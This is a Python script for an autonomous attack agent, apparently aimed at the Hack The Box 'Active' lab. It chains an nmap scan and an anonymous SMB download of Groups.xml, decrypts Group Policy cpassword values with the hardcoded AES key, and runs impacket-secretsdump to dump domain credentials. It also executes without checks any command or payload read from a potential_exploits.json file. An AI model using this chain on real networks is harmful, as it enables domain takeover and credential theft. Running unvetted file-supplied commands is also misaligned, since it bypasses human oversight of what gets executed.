import sys, json, time, re, logging, base64, hashlib
from pathlib import Path
from Crypto.Cipher import AES
from core.state_manager import StateManager
from utils.smart_executor import SmartCommandExecutor
from utils.exploit_matcher import ExploitMatcher

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s", handlers=[logging.StreamHandler(sys.stdout)])
logger=logging.getLogger("EnterpriseDynamicAgent")

MAX_STEPS=30
MAX_SAME_ACTION_ATTEMPTS=2
CANONICAL_SCAN="version_scan.txt"
LEGACY_SCANS=("full_recon.txt",)

class EnterpriseDynamicAgent:
    def __init__(self,target_ip:str,domain_name:str=None):
        self.target_ip=target_ip; self.domain_name=domain_name
        self.state_manager=StateManager(target_ip)
        state=self.state_manager.load_state()
        self.current_step=int(state.get("step_count",0))+1
        self.executor=SmartCommandExecutor(timeout_minutes=20,poll_interval=15)
        self.exploit_matcher=ExploitMatcher(target_ip)

    def extract_domain_from_scan(self,scan_content:str):
        if self.domain_name:return
        m=re.search(r"Domain:\s*([a-zA-Z0-9.-]+\.[a-zA-Z]+)",scan_content,re.I)
        self.domain_name=m.group(1).lower() if m else "active.htb"
        if m:self.state_manager.update_etc_hosts(domain_name=self.domain_name)

    def decrypt_gpp_password(self,cpassword:str)->str:
        try:
            decoded=base64.b64decode(cpassword+"="*((4-len(cpassword)%4)%4))
            key=(b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8"
                 b"\xf4\x96\xae\x0a\x3d\x7e\x1c\xf7\xfe\xee\x1f\xd3\xfa\x06\x30\x7c")
            d=AES.new(key,AES.MODE_CBC,b"\x00"*16).decrypt(decoded); n=d[-1]
            return d[:-n].decode("utf-16le",errors="ignore")
        except Exception:return None

    def parse_loot_for_credentials(self):
        creds={"username":None,"password":None}; loot=Path(f"testing/{self.target_ip}/loot")
        if not loot.exists():return creds
        for p in loot.glob("**/*.xml"):
            try:
                s=p.read_text(encoding="utf-8",errors="ignore")
                u=re.search(r'userName="([^"]+)"',s,re.I); cp=re.search(r'cpassword="([^"]+)"',s,re.I)
                if u:creds["username"]=u.group(1)
                if cp:creds["password"]=self.decrypt_gpp_password(cp.group(1))
            except Exception:continue
        return creds

    @staticmethod
    def fingerprint(command):
        return hashlib.sha256(re.sub(r"\s+"," ",command.strip()).encode()).hexdigest()[:16]

    def scan_path(self):
        p=Path(f"testing/{self.target_ip}/scans/{CANONICAL_SCAN}")
        if p.exists():return p
        for name in LEGACY_SCANS:
            q=p.parent/name
            if q.exists():
                logger.info("[+] Recon legacy detectado: %s; se considera completado.",q)
                return q
        return p

    def determine_next_action(self,state):
        history=state.get("history",[]); commands=[h.get("command","") for h in history]
        for raw_path in (Path(f"testing/{self.target_ip}/potential_exploits.json"),Path("potential_exploits.json")):
            if not raw_path.exists():continue
            try:
                data=json.loads(raw_path.read_text(encoding="utf-8"))
                items=data if isinstance(data,list) else next((data[k] for k in ("exploits","vulnerabilities","comandos","commands") if isinstance(data.get(k),list)),[])
                for item in items:
                    cmd=item if isinstance(item,str) else (item.get("command") or item.get("exec") or item.get("exploit") or item.get("payload"))
                    if cmd and cmd not in commands:return cmd,"exploitation","json_exploit"
            except (OSError,json.JSONDecodeError):pass

        scan=self.scan_path()
        if not scan.exists():
            return (f"nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269 -oN testing/{self.target_ip}/scans/{CANONICAL_SCAN} {self.target_ip}","recon","recon.version")
        self.extract_domain_from_scan(scan.read_text(encoding="utf-8",errors="ignore"))
        domain=self.domain_name or "active.htb"; loot=Path(f"testing/{self.target_ip}/loot"); loot.mkdir(parents=True,exist_ok=True)
        if not list(loot.glob("**/*.xml")) and not any("Replication" in c for c in commands):
            return (f"smbclient -U '%' -N //{self.target_ip}/Replication -c 'recurse ON; prompt OFF; lcd {loot}; mget *Groups.xml'","exploitation","enum.replication")
        creds=self.parse_loot_for_credentials()
        if creds["username"] and creds["password"] and not any("secretsdump" in c for c in commands):
            return f"impacket-secretsdump {domain}/{creds['username']}:{creds['password']}@{self.target_ip}","post-exploitation","post.secretsdump"
        return "echo '[*] Auditoría completada. No se encontraron más vectores de ataque.'","complete","complete"

    def run_autonomous_loop(self):
        while self.current_step<=MAX_STEPS:
            state=self.state_manager.load_state()
            if state.get("mission_complete"):return
            command,phase,action_id=self.determine_next_action(state)
            attempts=state.get("action_attempts",{}).get(action_id,0)
            recent=state.get("history",[])
            fp=self.fingerprint(command)
            repeats=sum(self.fingerprint(h.get("command",""))==fp for h in recent[-6:])
            if action_id in set(state.get("completed_actions",[])) or attempts>=MAX_SAME_ACTION_ATTEMPTS or repeats>=MAX_SAME_ACTION_ATTEMPTS:
                self.state_manager.mark_complete(f"loop_or_duplicate:{action_id}",self.current_step)
                logger.warning("[!] Loop/duplicado detenido: %s",action_id); return
            if phase=="complete":
                self.state_manager.mark_complete("planner_complete",self.current_step); return
            logger.info("[*] Paso %d/%d | %s | %s",self.current_step,MAX_STEPS,action_id,command)
            result=self.executor.execute_with_polling(command); output=result.get("stdout","")
            if result.get("stderr"):output+="\nSTDERR:\n"+result["stderr"]
            self.state_manager.save_state(self.current_step,{"step":self.current_step,"action_id":action_id,"command":command,"output":output[:8000],"status":result.get("status"),"returncode":result.get("returncode")},phase,False,extra={"last_action_id":action_id,"last_command_fingerprint":fp,"action_attempts":{**state.get("action_attempts",{}),action_id:attempts+1}})
            self.current_step+=1; time.sleep(1)
        self.state_manager.mark_complete("max_steps",self.current_step)
        logger.warning("[!] Límite global de %d pasos alcanzado.",MAX_STEPS)

if __name__=="__main__":
    EnterpriseDynamicAgent(sys.argv[1] if len(sys.argv)>1 else "10.129.9.175").run_autonomous_loop()
